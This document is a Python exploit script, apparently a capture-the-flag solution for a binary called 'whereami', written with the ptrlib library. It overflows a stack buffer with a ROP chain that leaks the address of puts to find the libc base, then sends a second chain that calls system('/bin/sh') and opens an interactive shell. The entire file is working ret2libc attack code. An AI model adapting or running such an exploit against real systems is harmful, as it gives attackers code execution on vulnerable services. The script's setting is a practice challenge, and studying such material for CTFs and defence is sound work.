#!/usr/bin/env python
import ptrlib as ptr
import sys

elf = ptr.ELF("./whereami_patched")
libc = ptr.ELF("./libc.so.6")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("localhost", 5000)
    else:
        return ptr.Process(elf.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()

    pl1 = b"A" * 0x48
    pl1 += ptr.p64(next(elf.gadget("pop rdi; ret;")))
    pl1 += ptr.p64(unwrap(elf.symbol("counter")))
    pl1 += ptr.p64(unwrap(elf.plt("gets")))
    pl1 += ptr.p64(next(elf.gadget("pop rdi; ret;")))
    pl1 += ptr.p64(unwrap(elf.got("puts")))
    pl1 += ptr.p64(unwrap(elf.plt("puts")))
    pl1 += ptr.p64(next(elf.gadget("ret;")))
    pl1 += ptr.p64(unwrap(elf.symbol("main")))

    io.sendlineafter("Who are you? ", pl1)

    io.sendline(ptr.p32(0))

    io.recvuntil("I hope you find yourself too.\n")
    libc.base = ptr.u64(io.recv(6)) - unwrap(libc.symbol("puts"))

    pl2 = b"A" * 0x48
    pl2 += ptr.p64(next(libc.gadget("ret;")))
    pl2 += ptr.p64(next(libc.gadget("pop rdi; ret;")))
    pl2 += ptr.p64(next(libc.find("/bin/sh")))
    pl2 += ptr.p64(unwrap(libc.symbol("system")))

    io.sendlineafter("Who are you? ", pl2)

    io.sh()


if __name__ == "__main__":
    main()
